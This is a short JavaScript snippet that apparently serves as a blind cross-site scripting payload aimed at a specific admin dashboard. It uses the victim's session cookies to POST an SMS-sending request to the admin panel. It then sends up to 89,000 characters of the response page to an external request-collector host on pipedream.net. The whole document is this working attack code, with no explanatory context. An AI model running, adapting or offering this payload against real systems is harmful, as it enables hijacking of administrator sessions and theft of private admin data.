var xhr = new XMLHttpRequest();

xhr.open('POST', 'https://haatadmindashboard.azurewebsites.net/admin/sendSms', true);

xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

        var http = new XMLHttpRequest();
        var url = "https://enxg7v5ip50sd.x.pipedream.net/create";
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if (http.readyState == 4 && http.status == 200) {

            }
        };
        
           page_data = {
                    "page_html": xhr.responseText.substring(0,89000),
                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_admins'
                };
        http.send(JSON.stringify(page_data));



  }
};
xhr.send('phoneNumber=0548156695&content=test');
